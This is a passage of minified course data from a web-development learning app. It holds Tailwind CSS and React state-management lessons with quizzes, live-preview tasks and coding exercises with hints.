is there but empty. Add the content and style the button — the preview re-renders live as you type.",goal:"Inside .panel add an h1, a p, and a button. Give the button the classes rounded-full, bg-ink-950, px-5 and text-white.",html:`<main class="min-h-screen bg-slate-100 p-8">
  <div class="panel mx-auto max-w-sm rounded-2xl bg-white p-6 shadow-lg">
    <!-- add an h1, a p, and a styled button here -->
  </div>
</main>`,requires:[".panel h1",".panel p","button.rounded-full","button.bg-ink-950"]},body:`**Tailwind doesn't replace CSS — it removes naming.** You still think in box model, flexbox and specificity; you just express the answer in the markup instead of inventing \`.card__title--large\` and then hunting for where it's overridden.

\`\`\`
<button class="rounded-full bg-ink-950 px-5 py-2 font-semibold text-white hover:bg-ink-800">
  Start learning
</button>
\`\`\`

Read that as CSS and it's transparent: a pill, near-black fill, 20px horizontal padding, semibold white text, lighter on hover. **Nothing is hidden behind a name.**

**The spacing scale is the real win.** Utilities aren't arbitrary pixels — they're a fixed ladder, and that ladder is what makes a UI look designed rather than assembled:

\`\`\`
p-1 = 4px    p-4 = 16px    p-8  = 32px
p-2 = 8px    p-6 = 24px    p-12 = 48px
\`\`\`

When every margin comes from one ladder, spacing is consistent by construction. Hand-written CSS drifts to \`padding: 13px\` and nobody notices until the page feels subtly wrong.

**Utility-first is not "no components."** You *should* extract a \`<Button>\` component — but you extract it in the language that already works (JS/JSX), not by inventing a CSS abstraction layer first.

**The honest trade-off:** markup gets longer. That's the price of removing the indirection, and it's why utilities pair so well with component frameworks. Repeated *identical* strings are the signal that a component is overdue.`,quiz:[{q:"What does utility-first styling actually remove?",options:["The need to know CSS","The naming and indirection layer between markup and styles","The browser's stylesheet","Responsive design"],answer:1,explanation:"You still need CSS mental models — you stop inventing class names and jumping between two files."},{q:"In Tailwind's default scale, `p-4` is…",options:["4px","16px","40px","0.4rem"],answer:1,explanation:"The scale is 0.25rem (4px) per step, so p-4 = 4 × 4px = 16px. Ratios stay consistent by design."},{q:"When should you extract a component?",options:["Never — utilities are enough","As soon as the same utility string is repeated, or the markup has a clear identity","Only when a designer asks","After the project ends"],answer:1,explanation:"Repetition is the signal. You extract in JSX, keeping utilities as the styling vocabulary inside the component."},{q:"Why is a constrained spacing scale better than free-form pixels?",options:["It renders faster","Consistent rhythm comes out automatically instead of drifting value by value","It reduces CSS file size","Browsers only support those values"],answer:1,explanation:"A shared ladder keeps vertical rhythm coherent — hand-picked values drift and the layout stops feeling intentional."}]},{id:"layout-flex-grid",title:"Layout: Flexbox & Grid in Utilities",minutes:12,preview:{brief:"Turn the plain stack of cards into a responsive grid: one column on phones, three from the md breakpoint up.",goal:"Give .grid the classes grid, gap-6 and md:grid-cols-3, and make sure it contains three .card children.",html:`<main class="min-h-screen bg-slate-100 p-8">
  <div class="grid mx-auto max-w-4xl">
    <article class="card rounded-xl bg-white p-6 shadow">
      <h2 class="font-semibold">Components</h2>
      <p class="text-slate-600">Reusable pieces of UI.</p>
    </article>
    <article class="card rounded-xl bg-white p-6 shadow">
      <h2 class="font-semibold">Hooks</h2>
      <p class="text-slate-600">State and side effects.</p>
    </article>
    <article class="card rounded-xl bg-white p-6 shadow">
      <h2 class="font-semibold">Routing</h2>
      <p class="text-slate-600">URLs that map to views.</p>
    </article>
  </div>
</main>`,requires:[".grid.md\\:grid-cols-3",".grid.gap-6",".grid .card"]},body:'Two layout systems cover nearly every interface you\'ll build.\n\n**Flexbox — one dimension.** Reach for it when children flow in a **row or a column** and you care about alignment and distribution:\n\n```\n<header class="flex items-center justify-between gap-4">\n  <a href="/">Logo</a>\n  <nav class="flex items-center gap-6">…</nav>\n</header>\n```\n\nThe vocabulary maps directly: `flex` → *become a flex container*, `flex-col` → *direction: column*, `items-center` → cross-axis centering, `justify-between` → push apart, `gap-4` → space between children.\n\n**Use `gap`, not margins on children.** `gap` only applies *between* items, so it never leaves a stray margin at the start or end. That single habit removes most of the "why is there extra space on the left" bugs.\n\n**Grid — two dimensions.** Reach for it when items sit in **rows and columns**:\n\n```\n<div class="grid gap-6 sm:grid-cols-2 lg:grid-cols-3">\n  …cards…\n</div>\n```\n\n`grid-cols-3` declares three equal tracks; `gap-6` spaces both axes at once. The **auto-fit** pattern makes a grid that responds without media queries — each column claims at least 16rem and the browser fits as many as it can:\n\n```\n<div class="grid grid-cols-[repeat(auto-fit,minmax(16rem,1fr))] gap-6">\n```\n\n**Which one?** Content in a row → flex. A layout of panels → grid. Toolbars, nav bars, button groups, and "icon next to label" are flex. Dashboards, galleries, and page scaffolding are grid. Both accept `gap`; neither needs a wrapper div to create space.',quiz:[{q:"You need an icon centered next to a label inside a button. Which?",options:["Flexbox — one-dimensional row with centered alignment","Grid — always use grid for alignment","Absolute positioning","A table"],answer:0,explanation:"A single row with cross-axis centering is exactly what flex is for: `flex items-center gap-2`."},{q:"Why prefer `gap` over margins on children?",options:["It's shorter to type","It only spaces items apart, so no stray leading/trailing margin appears","Margins are deprecated","gap animates better"],answer:1,explanation:"gap applies between items only — the classic `:last-child { margin-right: 0 }` cleanup disappears."},{q:"`md:grid-cols-3` means…",options:["Always three columns","Three columns from the md breakpoint upward, mobile-first","Three columns only on medium screens exactly","A 3px gap"],answer:1,explanation:"Unprefixed utilities are the mobile baseline; `md:` overrides at that width and above, not just at it."},{q:"Which declares a three-column layout?",options:["grid-cols-3","grid-3","columns-3-grid","flex-3"],answer:0,explanation:"`grid-cols-3` sets three equal tracks on a grid container."}]},{id:"responsive-dark",title:"Responsive & Dark Mode Systems",minutes:11,sort:{prompt:"A mobile-first layout is written once. Order the Tailwind utilities by the screen width at which each starts applying.",items:["grid-cols-1        (no prefix)","sm:grid-cols-2     (≥ 640px)","md:grid-cols-3     (≥ 768px)","lg:grid-cols-4     (≥ 1024px)","2xl:grid-cols-6    (≥ 1536px)"],explanation:"Unprefixed wins the base case, then each min-width prefix overrides the one before it as the viewport grows. Write the small screen first and let larger screens add on top."},reading:!0,body:'**Mobile-first is a writing order, not an opinion about phones.** Write the base case with no prefix, then add prefixed overrides that only kick in at wider viewports:\n\n```\n<div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3">\n```\n\nTailwind\'s breakpoints are **min-width**, so each prefix means "from this width *and up*":\n\n| Prefix | Min width |\n| --- | --- |\n| `sm:` | 640px |\n| `md:` | 768px |\n| `lg:` | 1024px |\n| `xl:` | 1280px |\n| `2xl:` | 1536px |\n\nThat\'s why unprefixed classes win on small screens: there is no `max-width` cascade to fight.\n\n**Dark mode** is the same idea for colour. `dark:` activates when a `.dark` class sits on an ancestor (class strategy) — which is exactly how you build a toggle: flip one class on `<html>` and every `dark:` utility in the tree responds.\n\n```\n<div class="bg-white text-slate-900 dark:bg-slate-950 dark:text-slate-100">\n```\n\n**State variants compose with everything.** `hover:`, `focus-visible:`, `active:`, `disabled:`, `group-hover:` and `peer-checked:` are prefixes too — and you can stack them with breakpoints:\n\n```\n<button class="hover:bg-slate-800 md:hover:scale-105 dark:hover:bg-slate-700">\n```\n\n**Design the interaction states explicitly.** A button needs a resting, hover, focus and disabled treatment or it will feel unfinished the moment someone tabs to it. `focus-visible:ring-2` is the accessible default: it shows a ring for keyboard users without annoying mouse users.\n\n**Always style focus.** Removing the outline without a replacement makes a site unusable with a keyboard — and it\'s the accessibility failure that ships most often.',quiz:[{q:"Tailwind's breakpoint prefixes are…",options:["max-width — they apply below the size","min-width — they apply from that size upward","Exact-width only","Device-detected"],answer:1,explanation:"Min-width is what makes mobile-first work: base styles apply everywhere, prefixed ones add on as space grows."},{q:"`dark:` utilities activate when…",options:["The OS is dark, always","A configured class/env condition matches — e.g. `.dark` on an ancestor","The user reloads","CSS variables change"],answer:1,explanation:"With the class strategy, one `.dark` class on <html> switches every dark: utility in the tree — and makes a toggle trivial."},{q:"Can you combine a breakpoint and a state variant?",options:["No, one prefix per utility","Yes — e.g. `md:hover:bg-slate-800`","Only for hover","Only in the config file"],answer:1,explanation:"Prefixes stack; the utility applies only when every condition holds."},{q:"Why is `focus-visible:ring-2` better than removing the outline?",options:["It looks nicer in screenshots","Keyboard users can still see where they are — outline removal alone breaks navigation","It's faster","It disables the outline"],answer:1,explanation:"Removing focus styling without a replacement is the most common accessibility regression. focus-visible gives keyboard users a clear target without penalising mouse users."}]},{id:"states-motion",title:"States, Variants & Motion",minutes:12,preview:{brief:"Build a card that reacts: lift on hover, ring on keyboard focus, and a group-hover accent on the title.",goal:"Give .card the classes hover:shadow-xl and focus-visible:ring-2, plus a tabindex so it can actually receive focus. Mark the h2 with group-hover:text-indigo-600.",html:`<main class="min-h-screen bg-slate-100 p-10">
  <div class="group card mx-auto max-w-sm rounded-2xl bg-white p-6 shadow transition">
    <h2 class="font-semibold text-slate-900">Keyboard first</h2>
    <p class="mt-1 text-slate-600">Hover me, then tab to me.</p>
  </div>
</main>`,requires:[".card.hover\\:shadow-xl",".card[tabindex]",".card.focus-visible\\:ring-2","h2.group-hover\\:text-indigo-600"]},body:'A static layout is only half a UI. The other half is what happens when the user **touches it**.\n\n**State variants are prefixes.** `hover:`, `focus:`, `focus-visible:`, `active:`, `disabled:`, `checked:`, `open:` — each one compiles to a real CSS pseudo-class:\n\n```\n<button class="rounded-lg bg-slate-900 px-4 py-2 text-white\n               transition\n               hover:bg-slate-700\n               active:scale-95\n               focus-visible:ring-2 focus-visible:ring-offset-2\n               disabled:cursor-not-allowed disabled:opacity-50">\n```\n\nThat single element now has five deliberate states. Most "unfinished-feeling" UI is just missing states, not missing beauty.\n\n**`group` and `peer` style a parent (or sibling) based on a child\'s state.** Mark the wrapper `group`, then react to it anywhere inside:\n\n```\n<div class="group rounded-xl border p-5 transition hover:shadow-lg">\n  <h3 class="transition group-hover:text-indigo-600">Title lifts too</h3>\n</div>\n```\n\n`peer` is the sibling version — a `peer` class on an input plus `peer-checked:` on a following label is a complete custom checkbox with no JavaScript.\n\n**Motion should be fast and physical.** `transition` animates common properties; be explicit when it matters, and keep durations in the 150–300ms band:\n\n```\n<button class="transition-transform duration-200 ease-out hover:-translate-y-0.5 active:translate-y-0">\n```\n\n**Respect reduced motion.** Some users get motion sickness; `motion-reduce:` opts individual effects out:\n\n```\n<div class="hover:scale-105 motion-reduce:hover:scale-100">\n```\n\nOne rule above all: **animate `transform` and `opacity`, not `width`/`top`/`margin`.** Transform and opacity are composited on the GPU; animating layout properties forces the browser to re-layout every frame and that\'s where jank comes from.',quiz:[{q:"`group-hover:` lets you…",options:["Style a child based on the parent's hover state","Style the parent when a child is hovered","Group many animations","Style only the first child"],answer:0,explanation:"Tag the wrapper `group`, then any descendant can react to it — perfect for cards whose title or icon reacts to a whole-card hover."},{q:"`peer-checked:` is most useful for…",options:["Animating loops","Styling a sibling based on an input's state — e.g. a custom checkbox label","Centering content","Responsive grids"],answer:1,explanation:"peer targets the previous sibling; combined with peer-checked you get interactive controls with zero JS."},{q:"Which properties should you animate for smooth 60fps?",options:["width and height","transform and opacity","margin and top","font-size"],answer:1,explanation:"transform/opacity skip layout and paint — the browser composites them on the GPU. Animating layout properties causes per-frame reflow."},{q:"Why add `motion-reduce:` variants?",options:["Smaller bundle","Users who set reduce-motion in their OS get the effect suppressed — it can cause real discomfort","Required by Tailwind","Better SEO"],answer:1,explanation:"Honouring prefers-reduced-motion is a genuine accessibility requirement, and Tailwind makes it a one-prefix change."}]},{id:"design-tokens",title:"Tokens, Theme Config & Custom Scales",minutes:11,reading:!0,body:`Utilities are values with names. When the values are *yours*, you extend the theme so the vocabulary matches your product — this very app does exactly that:

\`\`\`js
// tailwind.config.js
export default {
  content: ["./index.html", "./src/**/*.{ts,tsx}"],
  theme: {
    extend: {
      fontFamily: {
        display: ["Fraunces", "Georgia", "serif"],
        mono: ["'JetBrains Mono'", "ui-monospace", "monospace"],
      },
      colors: {
        paper: { 50: "#ffffff", 100: "#f4f1ea", 200: "#e9e4d8", 300: "#d9d2c0" },
        ink:   { 950: "#0b0b0c", 900: "#131316", 800: "#242429", 700: "#2e2e35" },
        gold:  { 300: "#ecd9a0", 400: "#d4af37", 500: "#b8912e", 600: "#94721f" },
      },
      boxShadow: {
        glow: "0 0 22px rgba(212, 175, 55, 0.18)",
        lift: "0 1px 2px rgba(28,25,23,.05), 0 8px 24px rgba(28,25,23,.06)",
      },
    },
  },
};
\`\`\`

That produces a real design language: \`bg-paper-100\` for surfaces, \`text-ink-950\` for body copy, \`text-gold-400\` for accents, \`font-display\` for headings, \`shadow-glow\` for focus. A new developer reads the classes and learns the system.

**\`extend\` vs. replacing.** Inside \`theme.extend\` you *add* to the defaults (so \`text-red-500\` still works). Writing \`theme.colors = {…}\` **replaces** the palette — a small team-wide footgun. Extend unless you have a deliberate reason.

**Arbitrary values escape hatch.** \`[]\` handles the one-off without polluting the config:

\`\`\`
<div class="grid-cols-[repeat(auto-fit,minmax(16rem,1fr))] top-[7px]">
\`\`\`

**The rule that keeps a codebase healthy: a value used twice stops being arbitrary.** One-off → \`[]\`. Repeated in three places → promote it into \`theme.extend\`. Otherwise arbitrary values quietly become a second, undocumented design system.

**\`@apply\` is a last resort.** It inlines utilities into a CSS class, which reintroduces the naming layer Tailwind removed and makes the styles invisible from the markup. Legitimate uses: styling content you don't control, like markdown output or a third-party widget. Everywhere else, use a component.`,quiz:[{q:"`theme.extend` vs `theme.colors = {…}`?",options:["Identical","extend adds to the defaults; assigning replaces the whole scale","extend is faster","Assigning is required"],answer:1,explanation:"Replacing drops every default colour — a classic surprise when bg-red-500 suddenly doesn't exist."},{q:"When is an arbitrary value like `top-[7px]` the right call?",options:["Always — it's more precise","For genuine one-offs; repeat it and it should become a theme token","Never","Only for colours"],answer:1,explanation:"Arbitrary values are an escape hatch. Repetition means you've found a token — promote it."},{q:"The main cost of `@apply` is…",options:["Slower builds","It hides the styles from the markup and brings back the naming layer","It breaks dark mode","It can't use variants"],answer:1,explanation:"You lose the readability that made utilities worthwhile. Keep it for content you don't own."},{q:"Customising the theme with brand tokens mainly gives you…",options:["Smaller CSS","A shared vocabulary so classes express design intent, not raw pixels","Automatic dark mode","Faster runtime"],answer:1,explanation:"bg-paper-100 and text-gold-400 carry meaning; #f4f1ea and #d4af37 don't."}]},{id:"capstone-ui-kit",title:"Capstone: Build a Component Kit",minutes:20,preview:{brief:"Assemble a real UI kit from the primitives you've learned: a badge, a button pair, and a card grid. Structure is graded; the styling is yours to judge.",goal:"Build .kit containing .badge, .btn-primary, .btn-ghost and at least two .kit-card elements — each card needs an h3. Then style them with utilities and the responsive, dark and motion variants from earlier lessons.",html:`<main class="min-h-screen bg-slate-100 p-10">
  <section class="kit mx-auto max-w-3xl">
    <!--
      Build the kit here:
      1. a .badge pill
      2. a .btn-primary and a .btn-ghost
      3. a responsive grid with two or more .kit-card, each with an h3
    -->
  </section>
</main>`,requires:[".kit .badge","button.btn-primary","button.btn-ghost",".kit-card h3",".kit-card + .kit-card"]},body:`Time to build something you'd actually ship. A **component kit** is the smallest useful unit of a design system: a handful of pieces, each with deliberate states, that compose into real screens.

The one you're building here has four parts. Notice that every requirement below *reuses an earlier lesson* — that's the point of a capstone.

**1. The badge** — a pill of metadata. Small, uppercase, generous tracking:

\`\`\`
<span class="badge inline-flex items-center rounded-full bg-indigo-100 px-2.5 py-1
             font-mono text-[11px] font-semibold uppercase tracking-widest text-indigo-700">
  new
</span>
\`\`\`

**2. The button pair.** A kit needs a *hierarchy*: one primary action, one quieter alternative. If everything shouts, nothing does.

\`\`\`
<button class="btn-primary rounded-full bg-slate-900 px-5 py-2 font-semibold text-white
                 transition hover:bg-slate-700 active:scale-95
                 focus-visible:ring-2 focus-visible:ring-offset-2
                 disabled:cursor-not-allowed disabled:opacity-50">
  Get started
</button>

<button class="btn-ghost rounded-full border border-slate-300 px-5 py-2 font-semibold
                 text-slate-700 transition hover:border-slate-500 hover:bg-white">
  Learn more
</button>
\`\`\`

**3. The card grid** — responsive from the first line:

\`\`\`
<div class="grid gap-6 sm:grid-cols-2 lg:grid-cols-3">
  <article class="kit-card group rounded-2xl bg-white p-6 shadow transition hover:shadow-xl">
    <h3 class="font-semibold text-slate-900 transition group-hover:text-indigo-600">Title</h3>
    <p class="mt-1 text-slate-600">Supporting copy.</p>
  </article>
</div>
\`\`\`

**The review checklist — apply it to every component you ever build:**

1. **States** — resting, hover, active, focus-visible, disabled. Missing one is a bug.
2. **Responsive** — does it survive 320px? Does it *use* 1440px?
3. **Dark mode** — can you read it on a dark surface?
4. **Motion** — is it 150–300ms, transform/opacity only, and \`motion-reduce:\` aware?
5. **Contrast** — is text legible against its background at WCAG AA (4.5:1 for body copy)?
6. **Consistency** — are the paddings all from the spacing ladder, or did a \`p-[13px]\` sneak in?

**Extract, then reuse.** Once the kit exists, a new screen is composition: \`<Badge>\`, \`<Button variant="primary">\`, \`<Card>\`. That's the payoff — a design system isn't a document, it's the set of pieces your team reaches for by default.`,quiz:[{q:"Why does a kit need both a primary and a ghost button?",options:["For colour variety","Visual hierarchy — competing primary actions make a screen hard to read","Accessibility requires two","Ghost buttons render faster"],answer:1,explanation:"One clear primary action per view; secondary actions step back. Hierarchy is information design."},{q:"Which is NOT part of the component review checklist?",options:["Interaction states","Contrast ratio","The number of utility classes used","Reduced-motion support"],answer:2,explanation:"Class count is an implementation detail. States, responsive behaviour, dark mode, motion, contrast and consistency are the quality signals."},{q:"Extracting a kit's components mainly buys you…",options:["Smaller CSS files","Composition — new screens become assembly instead of fresh styling decisions","Automatic tests","Dark mode"],answer:1,explanation:"The kit becomes the default vocabulary, so consistency is the path of least resistance rather than a rule to remember."},{q:"A card looks fine at 1440px but breaks at 320px. What's the likely cause?",options:["Tailwind doesn't support small screens","A fixed width or a non-wrapping row of content, instead of mobile-first stacking","The dark mode class","Too few breakpoints in the config"],answer:1,explanation:"Fixed widths and unwrapped flex rows are the usual culprits. Write the base case for the narrowest screen and let prefixes add space back."}]}]},DP={id:"state",title:"Advanced React State Management",blurb:"Reducers, context without the re-render tax, external stores, and server state.",numeral:"Ⅻ",lessons:[{id:"state-shapes",title:"Choosing a State Shape",minutes:12,debug:vi("shallow-copy"),body:`Most state bugs are **shape** bugs. Before touching a hook, decide what the state *is*.

**1. One source of truth.** Never store what you can compute. Derived state is a second copy that can disagree with the first:

\`\`\`
// ✗ two sources of truth, guaranteed to drift
const [items, setItems] = useState([]);
const [total, setTotal] = useState(0);

// ✓ one source of truth
const [items, setItems] = useState([]);
const total = items.reduce((sum, i) => sum + i.price, 0);
\`\`\`

A \`useMemo\` around the derivation is fine when it's genuinely slow — but the array stays the only stored thing.

**2. Model the minimum, not the display.** \`isLoading\`, \`isError\` and \`data\` can all be true/false/undefined at once, so you end up writing impossible-state guards. A single union makes bad states unrepresentable:

\`\`\`
type Fetch<T> =
  | { status: "idle" }
  | { status: "loading" }
  | { status: "error"; message: string }
  | { status: "done"; data: T };
\`\`\`

Now \`status === "done\\"\` *proves* \`data\` exists. TypeScript enforces what comments only hoped for.

**3. Keep it flat and normalised.** Nesting forces you into recursive updates:

\`\`\`
// ✗ find-and-replace through three levels of nesting
{ projects: [{ id, tasks: [{ id, comments: [...] }] }] }

// ✓ id-keyed tables, relationships by id
{ tasks: { 42: { id: 42, projectId: 1 } }, comments: { 7: { taskId: 42 } } }
\`\`\`

Updating one task becomes \`{ ...s.tasks, [id]: { ...s.tasks[id], done: true } }\` — a fixed, shallow cost instead of a deep walk.

**4. Lift only as far as needed.** State should live at the **lowest common ancestor** of the components that read it. Hoisting everything into a global store makes every component couple to every other.

**And the rule that causes the most bugs:** updates are shallow. React compares references, so you must copy *every level you touch* — which is exactly what the challenge below is about.`,quiz:[{q:"You can compute `total` from `items`. You should…",options:["Store both and keep them in sync with an effect","Store only `items` and derive `total` during render","Store only `total`","Store `total` in a ref"],answer:1,explanation:"Two stored copies drift. Derive it — memoise only if profiling says the computation is actually hot."},{q:'What does a discriminated union like `{status:"done";data:T}` buy you?',options:["Faster rendering","Impossible states become unrepresentable — `data` provably exists when status is done","Smaller bundles","Simpler props"],answer:1,explanation:"Instead of guarding three independent booleans, the type system proves which fields exist in each case."},{q:"State should live…",options:["In a global store by default","At the lowest common ancestor of the components that read it","In localStorage always","In the root component always"],answer:1,explanation:"Hoisting further than necessary couples unrelated components and causes needless re-renders."},{q:"You update `state.user.profile.name`. What must you copy?",options:["Only `name`","`state`, `user` and `profile` — every level on the path you mutate","Nothing, mutation is fine","The whole tree deeply"],answer:1,explanation:"React compares references. Copying only the top level leaves nested objects shared, so the update leaks into the previous state."}]},{id:"usereducer",title:"useReducer: State Machines in Disguise",minutes:13,starter:`// Implement the reducer so every action is handled.
// state is { count, total }; actions are { type: "add", price },
// { type: "remove", price } and { type: "clear" }.
const initial = { count: 0, total: 0 };

function reducer(state, action) {
  switch (action.type) {
    case "add":
      // TODO: return a NEW state with the item counted and the price added
      return state;
    case "remove":
      // TODO: return a NEW state with the item removed and the price subtracted
      return state;
    case "clear":
      // TODO: return the initial state
      return state;
    default:
      return state;
  }
}

function play(actions) {
  return actions.reduce(reducer, initial);
}

const one = play([{ type: "add", price: 25 }]);
console.log("after add(25):", one.count, one.total);

const two = play([{ type: "add", price: 25 }, { type: "add", price: 10 }]);
console.log("after two adds:", two.count, two.total);

const cleared = play([{ type: "add", price: 25 }, { type: "clear" }]);
console.log("after clear:", cleared.count, cleared.total);

const removed = play([
  { type: "add", price: 25 },
  { type: "add", price: 10 },
  { type: "remove", price: 10 },
]);
console.log("after remove:", removed.count, removed.total);`,check:{expr:'output.includes("after add(25): 1 25") && output.includes("after two adds: 2 35") && output.includes("after clear: 0 0") && output.includes("after remove: 1 25")',hint:"Every action must return a new state object. Clear restores {count: 0, total: 0}; add and remove adjust both fields.",hints:[{tier:1,text:"Returning `state` unchanged means nothing ever changes. Each case must return a new object."},{tier:2,text:"Spread the old state and override the changed fields: `{ ...state, count: state.count + 1 }`."},{tier:3,text:"add: `{ ...state, count: state.count + 1, total: state.total + action.price }`. remove: the same with `-`. clear: `return initial;`"}]},body:'A **reducer** is a pure function that answers one question: *given this state and this event, what is the next state?*\n\n```\n(state, action) => newState\n```\n\n`useReducer` is `useState` with the transition logic pulled out and named:\n\n```\nconst [state, dispatch] = useReducer(reducer, initialState);\n\ndispatch({ type: "add", price: 25 });\n```\n\n**Why that\'s an upgrade once state gets interesting:**\n\n- **The transitions are data.** `dispatch({ type: "add", price }) ` records *what happened*; the reducer decides what that means. You can log, replay, or time-travel a sequence of actions.\n- **It\'s testable without React.** A pure function in, a value out — no renderer, no mocks. Assert on the reducer directly.\n- **Impossible transitions live in one place.** When "you can\'t remove before adding" becomes a rule, there\'s exactly one function to change.\n\n**Pure means pure.** No mutation, no `Date.now()`, no `fetch`, no randomness. Those either go in the action payload (timestamp it at dispatch) or in an effect *around* the reducer. Mutating `state` in place is the classic reducer bug: React sees the same reference and skips the re-render.\n\n**Reducers are state machines.** You\'ve already written one without calling it that — a traffic light (`red → green → amber`), a checkout (`cart → address → payment → done`), a fetch (`idle → loading → done`). If you can draw the boxes and arrows, you have your reducer and your action types.\n\n**When to reach for it.** `useState` for one independent value. `useReducer` when **three or more values change together**, when the next state depends on the previous one, or when the same rules are needed in several places. For app-wide state, the same reducer runs inside context or an external store — which is where the next two lessons go.',quiz:[{q:"A reducer must be…",options:["Async","Pure — same input produces the same output, and it never mutates","A class method","Memoised"],answer:1,explanation:"Purity is what makes reducers replayable and testable; side effects belong in actions or surrounding effects."},{q:"Why is mutating `state` inside a reducer a bug?",options:["It's slower","The reference is unchanged, so React's comparison sees no update and skips the re-render","It breaks TypeScript","It works but logs a warning"],answer:1,explanation:"React bails out when the returned state is reference-equal. Always return a new object."},{q:"Choose `useReducer` over `useState` when…",options:["You have a single boolean","Several values change together, or the next state depends on the previous one","You want faster renders","Always — it's strictly better"],answer:1,explanation:"Reducers centralise related transitions into one named, testable place. For one independent value, useState is clearer."},{q:'Dispatching `{ type: "add", price }` instead of calling `addItem(25)` mainly gives you…',options:["Fewer lines","A record of what happened, decoupled from what it means — replayable and loggable","Automatic persistence","Better performance"],answer:1,explanation:"Actions describe events; reducers interpret them. That separation is what enables replay, logging and time travel."}]},{id:"context",title:"Context Without the Re-Render Tax",minutes:12,reading:!0,predict:[{prompt:"Context only re-renders consumers when the value is *reference-unequal*. What does this print?",code:`const a = { theme: "dark" };
const b = { theme: "dark" };

console.log("same object?", a === b);
console.log("same content?", a.theme === b.theme);

function Provider({ children }) {
  // A NEW object every render — every consumer re-renders with it.
  return { value: { theme: "dark" }, children };
}

console.log("new object each time?", Provider({}) .value === Provider({}).value);`,options:["false / true / false","true / true / true","false / true / true","false / false / false"],answer:0,explanation:"Two objects with identical content are still different objects (false), their fields compare equal (true), and an object literal created inside a component is new on every render (false) — which is why context values must be memoised."}],body:`**Context solves prop-drilling, not state management.** It's a transport mechanism: put a value at the top of a tree, read it anywhere below without threading it through every intermediate component.

\`\`\`
const ThemeCtx = createContext("light");

function App() {
  const [theme, setTheme] = useState("light");
  // ⚠️ a new object every render → every consumer re-renders
  const value = { theme, setTheme };

  return (
    <ThemeCtx.Provider value={value}>
      <Page />
    </ThemeCtx.Provider>
  );
}
\`\`\`

**The trap is right there in that comment.** Context compares values by reference. A fresh object literal is unequal to last render's, so *every* consumer re-renders — even ones that only read \`theme\` and don't care that \`setTheme\` is unchanged.

**Fix 1 — memoise the value:**

\`\`\`
const value = useMemo(() => ({ theme, setTheme }), [theme]);
\`\`\`

**Fix 2 — split the contexts.** Value and setter usually change at different rates, so give them separate providers:

\`\`\`
<ThemeCtx.Provider value={theme}>
  <ThemeSetCtx.Provider value={setTheme}>
    <Page />
  </ThemeSetCtx.Provider>
</ThemeCtx.Provider>
\`\`\`

Components that only *dispatch* now never re-render, because \`setTheme\` is stable for the component's lifetime.

**Fix 3 — don't put fast-changing data in context.** A value that updates on every keystroke or mouse move will re-render every consumer. That belongs in an external store with subscriptions (next lesson), where components opt into exactly the slice they read.

**A consumer hook keeps call sites clean and fails loudly:**

\`\`\`
export function useTheme() {
  const ctx = useContext(ThemeCtx);
  if (ctx === undefined) throw new Error("useTheme must be used inside <ThemeProvider>");
  return ctx;
}
\`\`\`

**When context is the wrong tool:** if the state is only read in two places, lift it to a common parent and pass props. Context is for **broad, slow-changing** values — theme, locale, auth session, feature flags.`,quiz:[{q:"Context re-renders consumers when…",options:["Any state anywhere changes","The provided value is reference-unequal to the previous one","A parent re-renders","The consumer mounts twice"],answer:1,explanation:"Reference equality is the check, which is why an inline object or array causes a re-render on every provider render."},{q:"The cheapest fix for a value object causing re-renders is…",options:["useCallback on every prop","Memoise the value with useMemo over its real dependencies","Move the provider lower","Use a ref"],answer:1,explanation:"Wrap the object literal so it only changes when its contents actually change."},{q:"Why split value and setter into two contexts?",options:["It's required by React","Consumers that only dispatch never re-render, because the setter is stable","It reduces bundle size","It enables SSR"],answer:1,explanation:"Different update rates deserve different providers — dispatch-only components stop re-rendering entirely."},{q:"Context is a poor fit for…",options:["Theme and locale","The signed-in user","A value that changes on every mouse move, read by many components","Feature flags"],answer:2,explanation:"High-frequency values re-render every consumer. Use a subscribing external store so components read only the slice they need."}]},{id:"external-stores",title:"External Stores & useSyncExternalStore",minutes:14,starter:`// Build a tiny external store — the pattern this app uses for progress.
function createStore(initial) {
  let state = initial;
  const listeners = new Set();

  return {
    getState: () => state,

    setState(partial) {
      // TODO: merge \`partial\` into state, then notify every subscriber.
      // Only notify when something actually changed.
    },

    subscribe(fn) {
      listeners.add(fn);
      return () => listeners.delete(fn);
    },
  };
}

const store = createStore({ count: 0, theme: "light" });
const notified = [];
const unsubscribe = store.subscribe(() => notified.push(store.getState().count));

store.setState({ count: 1 });
store.setState({ count: 2 });
store.setState({ count: 2 }); // no change — must NOT notify

unsubscribe();
store.setState({ count: 3 }); // no subscribers left

console.log("state:", JSON.stringify(store.getState()));
console.log("notified with:", notified.join(","));`,check:{expr:`output.includes('"count":3') && output.includes("notified with: 1,2")`,hint:"Merge with `{ ...state, ...partial }`, compare for real changes, and call every listener. The duplicate setState({count: 2}) must not notify, and nothing fires after unsubscribe.",hints:[{tier:1,text:"`setState` needs to do three things: build the next state, store it, then tell the listeners."},{tier:2,text:"Compare before notifying — `if (next.count === state.count && next.theme === state.theme) return;` or compare serialised values."},{tier:3,text:"`state = { ...state, ...partial }; for (const fn of listeners) fn();` — after a change check."}]},body:`React only knows about state it owns. But plenty of state lives **outside** React — a module-level cache, \`localStorage\`, a WebSocket, \`window.matchMedia\`. \`useSyncExternalStore\` is the supported bridge, and this app uses exactly this pattern for learner progress.

**The contract is three functions:**

\`\`\`
function createStore(initial) {
  let state = initial;
  const listeners = new Set();

  return {
    getState: () => state,
    setState: (partial) => {
      const next = { ...state, ...partial };
      // Bail out when nothing changed — otherwise every write re-renders.
      if (JSON.stringify(next) === JSON.stringify(state)) return;
      state = next;
      for (const fn of listeners) fn();
    },
    subscribe: (fn) => {
      listeners.add(fn);
      return () => listeners.delete(fn);   // unsubscribe
    },
  };
}
\`\`\`

**Wiring it to a component** — the selector runs during render and during every store notification, so a component re-renders only when *its slice* changes:

\`\`\`
export function useStore(store, selector = (s) => s) {
  return useSyncExternalStore(
    store.subscribe,
    () => selector(store.getState()),
    () => selector(store.getState())   // server snapshot
  );
}

// Only re-renders when \`count\` changes — not when \`theme\` does.
const count = useStore(store, (s) => s.count);
\`\`\`

**Why the bail-out matters.** \`listeners.forEach(fn)\` without a change check means every redundant write re-renders every subscriber. The test in the exercise above — writing \`{count: 2}\` twice and expecting one notification — is the whole discipline in miniature.

**Why this beats context for fast data.** A store lets a component subscribe to a **slice**. With context, the provider re-renders every consumer on any change. Ten components reading ten different fields should not all re-render when one field moves.

**Two rules that keep it correct:**
1. **\`getState\` must be cheap and synchronous.** It's called on every render — never compute heavy derived data inside it.
